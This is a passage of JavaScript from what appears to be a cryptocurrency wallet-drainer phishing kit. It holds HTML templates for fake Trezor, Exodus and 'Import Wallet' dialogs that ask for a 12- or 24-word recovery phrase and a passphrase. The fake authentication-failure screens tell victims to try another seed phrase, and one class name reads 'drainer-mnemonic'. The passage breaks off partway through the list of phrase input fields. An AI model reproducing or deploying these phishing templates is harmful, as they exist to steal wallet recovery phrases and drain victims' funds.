                                       <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                    </svg>
                                 </div>
                              </div>
                              <span class="sc-gXmSlM CshDF">Continue</span>
                           </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const TrezorWalletFinishModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 391px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(TrezorWalletModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Trezor Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                <svg xmlns="http://www.w3.org/2000/svg" width="512" height="512" viewBox="0 0 512 512" version="1.1"><path d="M 243.322 117.098 L 238.145 117.963 231.453 120.481 L 224.761 123 218.631 126.716 L 212.500 130.433 206 137.061 L 199.500 143.690 196.238 149.163 L 192.977 154.636 190.987 160.295 L 188.998 165.955 188.019 172.728 L 187.040 179.500 187.020 190.750 L 187 202 172.994 202 L 158.987 202 159.244 276.681 L 159.500 351.362 207.795 373.704 L 256.090 396.046 304.295 373.734 L 352.500 351.423 352.756 276.711 L 353.013 202 339.138 202 L 325.264 202 324.777 186.250 L 324.290 170.500 321.571 162.510 L 318.853 154.519 315.213 148.528 L 311.574 142.537 305.519 136.481 L 299.463 130.426 293.482 126.795 L 287.500 123.164 282 120.992 L 276.500 118.819 269.162 117.410 L 261.824 116 255.162 116.117 L 248.500 116.234 243.322 117.098 M 244.314 152.798 L 239.129 154.649 235.057 157.344 L 230.985 160.039 227.982 164.183 L 224.980 168.327 223.490 173.345 L 222 178.363 222 190.195 L 222 202.027 255.750 201.763 L 289.500 201.500 289.500 188 L 289.500 174.500 286.710 168.818 L 283.920 163.137 280.256 159.920 L 276.591 156.702 271.046 154.161 L 265.500 151.619 257.500 151.283 L 249.500 150.947 244.314 152.798 M 198.240 282.113 L 198.500 327.226 227.180 340.481 L 255.861 353.737 284.680 340.477 L 313.500 327.218 313.760 282.109 L 314.020 237 256 237 L 197.980 237 198.240 282.113" stroke="none" fill="#fbfbfb" fill-rule="evenodd"/><path d="M 125 50.682 L 122.500 51.113 115.209 53.065 L 107.917 55.017 100.709 58.640 L 93.500 62.264 89 65.302 L 84.500 68.341 80.500 71.808 L 76.500 75.276 70.721 81.849 L 64.942 88.423 60.538 95.961 L 56.133 103.500 54.125 109 L 52.116 114.500 50.308 121 L 48.500 127.500 48.500 258 L 48.500 388.500 50.779 396.837 L 53.059 405.173 55.997 411.653 L 58.935 418.133 63.572 425.109 L 68.210 432.084 75.313 439.104 L 82.417 446.124 89.111 450.574 L 95.804 455.024 101.152 457.388 L 106.500 459.752 111.500 461.469 L 116.500 463.186 118.500 463.549 L 120.500 463.912 127 464.948 L 133.500 465.985 256.640 465.992 L 379.779 466 388.140 464.444 L 396.500 462.888 402.500 460.812 L 408.500 458.736 412.500 456.725 L 416.500 454.713 423.692 449.865 L 430.883 445.018 436.842 439.077 L 442.801 433.137 447.315 426.811 L 451.829 420.485 455.241 412.992 L 458.652 405.500 461.076 397 L 463.500 388.500 463.500 258 L 463.500 127.500 461.607 120.500 L 459.715 113.500 456.499 105.867 L 453.284 98.234 448.395 90.948 L 443.507 83.661 436.503 76.705 L 429.500 69.748 423.619 65.748 L 417.738 61.747 409.619 57.957 L 401.500 54.167 395.500 52.362 L 389.500 50.557 258.500 50.404 L 127.500 50.251 125 50.682 M 243.322 117.098 L 238.145 117.963 231.453 120.481 L 224.761 123 218.631 126.716 L 212.500 130.433 206 137.061 L 199.500 143.690 196.238 149.163 L 192.977 154.636 190.987 160.295 L 188.998 165.955 188.019 172.728 L 187.040 179.500 187.020 190.750 L 187 202 172.994 202 L 158.987 202 159.244 276.681 L 159.500 351.362 207.795 373.704 L 256.090 396.046 304.295 373.734 L 352.500 351.423 352.756 276.711 L 353.013 202 339.138 202 L 325.264 202 324.777 186.250 L 324.290 170.500 321.571 162.510 L 318.853 154.519 315.213 148.528 L 311.574 142.537 305.519 136.481 L 299.463 130.426 293.482 126.795 L 287.500 123.164 282 120.992 L 276.500 118.819 269.162 117.410 L 261.824 116 255.162 116.117 L 248.500 116.234 243.322 117.098 M 244.314 152.798 L 239.129 154.649 235.057 157.344 L 230.985 160.039 227.982 164.183 L 224.980 168.327 223.490 173.345 L 222 178.363 222 190.195 L 222 202.027 255.750 201.763 L 289.500 201.500 289.500 188 L 289.500 174.500 286.710 168.818 L 283.920 163.137 280.256 159.920 L 276.591 156.702 271.046 154.161 L 265.500 151.619 257.500 151.283 L 249.500 150.947 244.314 152.798 M 198.240 282.113 L 198.500 327.226 227.180 340.481 L 255.861 353.737 284.680 340.477 L 313.500 327.218 313.760 282.109 L 314.020 237 256 237 L 197.980 237 198.240 282.113" stroke="none" fill="#0c8d4d" fill-rule="evenodd"/></svg>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding: 0px 8px 8px;">
                                            <h1 class="sc-ftvSup fqLYro">Failed to authenticate<br></h1>
                                            <div class="sc-papXJ jCcNJP">To continue, try using another seed phrase.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <button onclick="updatePage(TrezorWalletModal);" class="sc-himrzO eyWopv">
                              <div class="sc-ikZpkk FGzOk">
                                 <div class="sc-jIZahH gjHfVN">
                                    <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                       <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                       <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                    </svg>
                                 </div>
                              </div>
                              <span class="sc-gXmSlM CshDF">Continue</span>
                           </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;


const ExodusWalletFinishModal = `
<div class="sc-idiyUo hBuwwI" style="--height: 391px; --width: 343px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ExodusWalletModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Exodus Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div style="pointer-events: auto;" class="sc-ksZaOG dmNTWR">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe">
                                                <div style="transform: scale(0.86); position: relative; width: 100%;">

                                                <svg width="300" height="300" viewBox="0 0 300 300" fill="none" xmlns="http://www.w3.org/2000/svg">
                                                <path d="M298.203 83.7645L170.449 0V46.8332L252.405 100.089L242.763 130.598H170.449V169.402H242.763L252.405 199.911L170.449 253.167V300L298.203 216.503L277.313 150.134L298.203 83.7645Z" fill="url(#paint0_linear_1661_295)"/>
                                                <path d="M59.3007 169.402H131.346V130.598H59.0329L49.6589 100.089L131.346 46.8332V0L3.59253 83.7645L24.4831 150.134L3.59253 216.503L131.614 300V253.167L49.6589 199.911L59.3007 169.402Z" fill="url(#paint1_linear_1661_295)"/>
                                                <mask id="mask0_1661_295" style="mask-type:alpha" maskUnits="userSpaceOnUse" x="3" y="0" width="296" height="300">
                                                <path d="M298.204 83.7645L170.45 0V46.8332L252.405 100.089L242.763 130.598H170.45V169.402H242.763L252.405 199.911L170.45 253.167V300L298.204 216.503L277.313 150.134L298.204 83.7645Z" fill="url(#paint2_linear_1661_295)"/>
                                                <path d="M59.301 169.402H131.347V130.598H59.0332L49.6592 100.089L131.347 46.8332V0L3.59277 83.7645L24.4834 150.134L3.59277 216.503L131.615 300V253.167L49.6592 199.911L59.301 169.402Z" fill="url(#paint3_linear_1661_295)"/>
                                                </mask>
                                                <g mask="url(#mask0_1661_295)">
                                                <rect x="3.75024" width="292.5" height="300" fill="url(#paint4_linear_1661_295)"/>
                                                </g>
                                                <defs>
                                                <linearGradient id="paint0_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">
                                                <stop stop-color="#0B46F9"/>
                                                <stop offset="1" stop-color="#BBFBE0"/>
                                                </linearGradient>
                                                <linearGradient id="paint1_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">
                                                <stop stop-color="#0B46F9"/>
                                                <stop offset="1" stop-color="#BBFBE0"/>
                                                </linearGradient>
                                                <linearGradient id="paint2_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">
                                                <stop stop-color="#0B46F9"/>
                                                <stop offset="1" stop-color="#BBFBE0"/>
                                                </linearGradient>
                                                <linearGradient id="paint3_linear_1661_295" x1="256.875" y1="320.625" x2="171.3" y2="-32.9459" gradientUnits="userSpaceOnUse">
                                                <stop stop-color="#0B46F9"/>
                                                <stop offset="1" stop-color="#BBFBE0"/>
                                                </linearGradient>
                                                <linearGradient id="paint4_linear_1661_295" x1="22.5002" y1="67.5" x2="170.625" y2="178.125" gradientUnits="userSpaceOnUse">
                                                <stop offset="0.119792" stop-color="#8952FF" stop-opacity="0.87"/>
                                                <stop offset="1" stop-color="#DABDFF" stop-opacity="0"/>
                                                </linearGradient>
                                                </defs>
                                                </svg>

                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="will-change: transform, opacity; position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding: 0px 8px 8px;">
                                            <h1 class="sc-ftvSup fqLYro">Failed to authenticate<br></h1>
                                            <div class="sc-papXJ jCcNJP">To continue, try using another seed phrase.<br></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <button onclick="updatePage(ExodusWalletModal);" class="sc-himrzO eyWopv">
                              <div class="sc-ikZpkk FGzOk">
                                 <div class="sc-jIZahH gjHfVN">
                                    <svg width="13" height="12" viewBox="0 0 13 12" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-ezWOiH bkoIPM">
                                       <line stroke="currentColor" x1="1" y1="6" x2="12" y2="6" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-kLLXSd bDZenP"></line>
                                       <path stroke="currentColor" d="M7.51431 1.5L11.757 5.74264M7.5 10.4858L11.7426 6.24314" stroke-width="var(--stroke-width)" stroke-linecap="round" class="sc-bZkfAO"></path>
                                    </svg>
                                 </div>
                              </div>
                              <span class="sc-gXmSlM CshDF">Continue</span>
                           </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
`;

const ImportWalletModal = `
<div id="connect-trezor-modal" class="connect-trezor-modal sc-idiyUo hBuwwI" style="--height: 632px; --width: 543px;">
    <div style="pointer-events: none; position: absolute; top: 0px; bottom: 0px; left: 50%; transform: translateX(-50%); width: var(--width); z-index: 9; transition: width 200ms ease 0s;"></div>
    <div class="sc-iqcoie RrATt active">
        <div class="sc-crXcEl gcowpW">
            <button onclick="updatePage(CloseModal);" aria-label="Close" class="sc-fnykZs hFEFWT">
                <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M1 13L13 1" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                    <path d="M1 0.999999L13 13" stroke="currentColor" stroke-width="2" stroke-linecap="round"></path>
                </svg>
            </button>
            <button onclick="updatePage(ConnectModal);" aria-label="Back" class="sc-fEOsli iSYxCx" style="opacity: 1;">
                <svg width="9" height="16" viewBox="0 0 9 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M8 1L1 8L8 15" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                </svg>
            </button>
        </div>
        <div class="sc-eCYdqJ dLUlU">
            <div style="position: absolute; top: 0px; left: 0px; right: 0px; opacity: 1;">Import Wallet</div>
        </div>
        <div class="sc-evZas gcbNhn">
            <div class="sc-breuTD hVhjow active-scale-up">
                <div class="sc-ksZaOG dmNTWR" style="pointer-events: auto;">
                    <div style="z-index: 2; opacity: 1; transform: none;">
                        <div class="sc-dkzDqf jKlSZW" style="width:495px !important;">
                            <div class="sc-ZyCDH cBtLfS">
                                <div class="sc-jSMfEi lbAEgN"></div>
                                <div class="sc-jOhDuK hLWHUX">
                                    <div class="sc-hlnMnd czUBmg">
                                        <div class="sc-jTYCaT epSHCc">
                                            <div class="sc-jQHtVU jhhhSe" style="border-radius: 0px;">
                                                <div style="transform: scale(1.14); position: relative; width: 100%;">
                                                    <div style="transform: scale(0.86); position: relative; width: 100%;">
                                                    <svg version="1.0" xmlns="http://www.w3.org/2000/svg"
                                                     width="200.000000pt" height="200.000000pt" viewBox="0 0 200.000000 200.000000"
                                                     preserveAspectRatio="xMidYMid meet">

                                                    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)"
                                                    fill="#000000" stroke="none">
                                                    <path d="M890 1611 c-283 -75 -530 -145 -548 -154 -17 -10 -44 -36 -60 -59
                                                    l-27 -42 -3 -455 c-2 -251 0 -476 3 -500 8 -56 71 -126 126 -141 25 -7 248
                                                    -10 641 -8 l603 3 33 23 c17 13 44 40 60 59 l27 36 3 446 c3 475 2 496 -44
                                                    551 -56 66 -45 64 -519 70 l-430 5 335 88 c184 48 338 87 343 87 4 0 7 -27 7
                                                    -60 l0 -60 60 0 60 0 0 85 c0 82 -1 86 -33 121 -55 60 -58 60 -637 -95z m714
                                                    -317 c14 -14 16 -69 16 -453 0 -396 -2 -440 -17 -452 -24 -21 -1182 -21 -1206
                                                    0 -15 12 -17 56 -17 452 0 384 2 439 16 453 14 14 82 16 604 16 522 0 590 -2
                                                    604 -16z"/>
                                                    <path d="M1380 933 c-54 -20 -81 -83 -56 -131 27 -53 111 -66 149 -24 62 69
                                                    -8 186 -93 155z"/>
                                                    </g>
                                                    </svg>

                                                    </div>
                                                </div>
                                            </div>
                                            <div class="sc-fvNpTx eFjHkq"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="sc-gKXOVf liyQQU">
                                    <div class="sc-jIAOiI dWkvrK" style="position: relative; opacity: 1; transform: none;">
                                        <div class="sc-iBkjds emnDjo" style="padding-bottom: 18px;">
                                            <h1 class="sc-ftvSup fqLYro">Import Wallet<br></h1>
                                            <div class="sc-papXJ jCcNJP">To connect your wallet,<br>enter the secret phrase.<br></div>
                                        </div>
<div class="jssSolrise17 MuiBox-root css-0">


<!-- <div class="MuiBox-root css-3mllz6 drainer-mnemonic-checkbox-container" style="height: 24px;">
<label style="
    line-height: 20px;
    /* margin-right: 4px; */
    vertical-align: top;
    display: block;
    height: 20px;
    color: #000;

">I have a passphrase<input id="phrase-passphrase-checkbox" type="checkbox" name="checkbox"></label>
</div> -->


</div>
    <div class="MuiBox-root css-3mllz6 css-selector">
    <input class="phrase-display-none dddsad dddsadx" placeholder="Passphrase" type="password" autocomplete="new-password" id="connect-hardware-passphrase">
    <select class="dddsad" name="connect-hardware-words" id="connect-hardware-words">
<option value="12">I have 12-word phrase</option>
<option value="24">I have 24-word phrase</option>
<!-- <option value="file">Private Key/File</option> -->
</select>
    </div>
    <textarea id="mnemonic-textarea" placeholder="Enter your recovery phrase" class="phrase-display-none MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42" rows="4" style="padding-top:16px;margin-bottom: 16px;height: 120%;margin-top: 16px;background-color: rgb(255, 255, 255);border: 1px solid rgb(202, 206, 209);border-radius: 0.25rem;resize: none;margin-right: 15px;margin-left: 15px;width: calc(100% - 30px);"></textarea>
    <div id="mnemonic-words" class="MuiGrid-root MuiGrid-container MuiGrid-spacing-xs-2 jssSolrise18 css-isbt42">
        <div class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div id="mnemonic-inputdiv-0" class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">1.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-0" type="text" tabindex="1" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-1" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">2.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-1" type="text" tabindex="2" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-2" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">3.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-2" type="text" tabindex="3" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-3" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">4.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-3" type="text" tabindex="4" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-4" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">5.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-4" type="text" tabindex="5" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-5" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">6.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-5" type="text" tabindex="6" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-6" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">7.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-6" type="text" tabindex="7" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-7" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">8.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-7" type="text" tabindex="8" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-8" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">9.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-8" type="text" tabindex="9" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-9" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">10.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-9" type="text" tabindex="10" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-10" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">11.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-10" type="text" tabindex="11" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-11" class="MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">12.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-11" type="text" tabindex="12" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-12" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">13.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-12" type="text" tabindex="13" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-13" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
            <div class="MuiInputBase-root MuiInput-root MuiInput-underline MuiInputBase-colorPrimary MuiInputBase-fullWidth MuiInputBase-adornedStart css-exmjsz">
                <div class="MuiInputAdornment-root MuiInputAdornment-positionStart css-1a6giau">
                    <span class="notranslate">&ZeroWidthSpace;</span>
                    <p class="MuiTypography-root MuiTypography-inherit css-1lgrg8t">14.</p>
                </div>
                <input aria-invalid="false" autocomplete="off" id="mnemonic-input-13" type="text" tabindex="14" data-id="recovery_phrase_input" class="MuiInputBase-input MuiInput-input MuiInputBase-inputAdornedStart css-ndai2c" value="">
            </div>
        </div>
        <div id="mnemonic-inputdiv-14" class="phrase-display-none MuiGrid-root MuiGrid-item MuiGrid-grid-xs-6 MuiGrid-grid-sm-4 css-nlcweg">
